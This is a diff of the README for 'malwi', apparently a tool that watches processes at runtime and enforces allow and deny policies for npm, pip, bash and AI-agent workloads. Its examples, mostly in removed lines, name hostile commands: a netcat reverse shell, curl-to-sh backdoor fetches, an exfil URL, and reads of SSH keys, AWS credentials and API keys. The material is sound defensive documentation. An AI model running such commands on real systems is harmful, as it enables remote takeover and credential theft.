@@ -25,13 +25,13 @@ pip install --user malwi
 A policy controls what `malwi` allows, denies, warns about, or logs. The default policy warns on credential access, privilege escalation, and suspicious commands:
 
 ```bash
-$ malwi x -- python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
+$ malwi x python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
 [malwi] warned: AWS_SECRET_ACCESS_KEY                    # credential theft
 
-$ malwi x -- node -e "require('child_process').execSync('ssh user@canvascomputing.org')"
+$ malwi x node -e "require('child_process').execSync('ssh user@canvascomputing.org')"
 [malwi] warned: ssh user@canvascomputing.org             # lateral movement
 
-$ malwi x -- bash -c 'echo cGF5bG9hZA== | base64 -d | sh'
+$ malwi x bash -c 'echo cGF5bG9hZA== | base64 -d | sh'
 [malwi] warned: base64 -d                                # obfuscated payload
 ```
 
@@ -123,69 +123,56 @@ symbols:
 
 ## Auto-policies
 
-When `malwi` detects a known command, it automatically applies a tailored policy. The policy file is written to `~/.config/malwi/policies/` on first use — edit it to customise.
+When `malwi` detects a known command, it automatically applies a tailored [policy](cli/src/policies/). The policy file is written to `~/.config/malwi/policies/` on first use — edit it to customise.
 
 #### <a id="openclaw"></a><img src="images/openclaw.png" alt="OpenClaw" height="20"> [OpenClaw](https://docs.openclaw.ai/)
 
-An OpenClaw agent connects to many external APIs. This policy guards the agent's own process — a compromised dependency can steal API keys, inject code, or open a reverse shell before any external safeguard sees it. Outbound traffic is limited to known providers; everything else is blocked. 
+([policy](cli/src/policies/openclaw.yaml)) An OpenClaw agent connects to many external APIs. This policy guards the agent's own process — a compromised dependency can steal API keys, inject code, or open a reverse shell before any external safeguard sees it. Outbound traffic is limited to known providers; everything else is blocked.
 
 > This policy does not protect against prompt injection or unsafe model outputs — only what the agent code itself does at runtime.
 
 ```bash
-$ malwi x -- openclaw gateway
-[malwi] denied: eval                                    # code injection
-[malwi] denied: nc canvascomputing.org 4444             # reverse shell
-[malwi] denied: read AWS_SECRET_ACCESS_KEY              # credential theft
-[malwi] warned: read OPENCLAW_API_KEY                   # legitimate key (visible)
+malwi x openclaw gateway
+malwi x node /usr/local/lib/node_modules/openclaw/dist/openclaw.mjs doctor
+malwi x openclaw.mjs gateway
 ```
 
 #### <a id="comfyui"></a><img src="images/comfyui.png" alt="ComfyUI" height="20"> [ComfyUI](https://docs.comfy.org/)
 
-Custom nodes can run arbitrary Python — a malicious one could load native libraries directly, exfiltrate your code to a remote, or steal stored credentials. This policy restricts network access to model hosting and package registries, and blocks the escape hatches that bypass Python-level controls.
+([policy](cli/src/policies/comfyui.yaml)) Custom nodes can run arbitrary Python — a malicious one could load native libraries directly, exfiltrate your code to a remote, or steal stored credentials. This policy restricts network access to model hosting and package registries, and blocks the escape hatches that bypass Python-level controls.
 
 ```bash
-$ malwi x -- python main.py
-[malwi] denied: ctypes.CDLL(libc.dylib)                 # raw C library bypass
-[malwi] denied: git push origin main                    # code exfiltration
-[malwi] denied: keyring.get_password(github.com)        # credential theft
-[malwi] denied: https://api.github.com/gists            # data exfil via allowed host
-[malwi] warned: subprocess.run(nvidia-smi)              # GPU detection (visible)
+malwi x python main.py # inside a ComfyUI directory
+malwi x python3 -m comfy --port 8188
+malwi x comfyui --listen
 ```
 
 #### <a id="npm-install"></a><img src="images/npm.png" alt="npm" height="20"> [npm-install](https://www.npmjs.com/)
 
-npm install can execute arbitrary scripts from any package in the dependency tree. A single malicious package can eval code, spawn shells, and exfiltrate SSH keys or tokens. This policy limits network to the npm registry and blocks everything an install script shouldn't need.
+([policy](cli/src/policies/npm-install.yaml)) npm install can execute arbitrary scripts from any package in the dependency tree. A single malicious package can eval code, spawn shells, and exfiltrate SSH keys or tokens. This policy limits network to the npm registry and blocks everything an install script shouldn't need.
 
 ```bash
-$ malwi x -- npm install express
-[malwi] denied: eval                                            # code injection
-[malwi] denied: child_process.exec(curl canvascomputing.org)    # reverse shell / exfil
-[malwi] denied: read ~/.ssh/id_rsa                              # SSH key theft
-[malwi] denied: https://canvascomputing.org/backdoor.sh         # payload download
+malwi x npm install express
+malwi x npm add lodash
+malwi x npm ci
 ```
 
 #### <a id="pip-install"></a><img src="images/pypi.png" alt="PyPI" height="20"> [pip-install](https://pypi.org/)
 
-Installing a package executes arbitrary code with full access to your machine — a malicious package can steal credentials and send them to a remote server before you ever import it. This policy locks network to PyPI and blocks the common exfiltration paths.
+([policy](cli/src/policies/pip-install.yaml)) Installing a package executes arbitrary code with full access to your machine — a malicious package can steal credentials and send them to a remote server before you ever import it. This policy locks network to PyPI and blocks the common exfiltration paths.
 
 ```bash
-$ malwi x -- pip install flask
-[malwi] denied: urllib.request.urlopen(url='https://canvascomputing.org/exfil')   # data exfiltration
-[malwi] denied: os.system(curl canvascomputing.org/backdoor | sh)                 # backdoor injection
-[malwi] denied: read ~/.aws/credentials                                           # cloud credential theft
-[malwi] denied: read ANTHROPIC_API_KEY                                            # API key theft
+malwi x pip install flask
+malwi x pip3 install requests
+malwi x python3 -m pip install six
 ```
 
 #### <a id="bash-execution"></a><img src="images/bash.png" alt="Bash" height="20"> [bash-execution](https://www.gnu.org/software/bash/)
 
-A remote shell script can establish persistence, exfiltrate data, or escalate privileges before you've read a single line. This policy blocks dangerous commands and prompts for review on anything that needs sudo.
+([policy](cli/src/policies/bash-install.yaml)) A remote shell script can establish persistence, exfiltrate data, or escalate privileges before you've read a single line. This policy blocks dangerous commands and prompts for review on anything that needs sudo.
 
 ```bash
-$ curl -fsSL https://www.canvascomputing.org/install-demo.sh | malwi x -- bash
-[malwi] denied: crontab -e                              # persistence via cron
-[malwi] denied: base64 -d /tmp/payload                  # obfuscated payload
-[malwi] denied: nc canvascomputing.org 4444             # reverse shell
-[malwi] review: sudo /usr/local/bin/install-tool        # privilege escalation (prompt)
+curl -fsSL https://www.canvascomputing.org/install-demo.sh | malwi x bash
 ```
 
 ## macOS System Integrity Protection (SIP)
